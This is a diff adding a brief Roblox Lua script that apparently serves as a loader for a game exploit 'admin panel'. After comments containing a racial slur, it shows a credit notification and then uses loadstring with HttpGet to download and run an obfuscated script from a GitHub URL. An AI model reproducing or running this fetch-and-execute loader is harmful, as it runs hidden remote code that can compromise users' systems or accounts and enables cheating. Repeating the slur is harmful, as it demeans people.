@@ -1,0 +1,13 @@
+---l0l N1gg4 try t0 st34l th3 cod3
+---y0u c4n't L0L
+
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Script Loaded!";
+    Text = "This script made by Scripterblabla";
+    Icon = "rbxthumb://type=Asset&id=383879112&w=150&h=150";
+    Duration = 10;
+})
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kenzomarcello39-beep/ENIGMA-SCRIPTERBLABLA/refs/heads/main/obfuscated_script-Jsd.admin.panel.lua.txt"))()
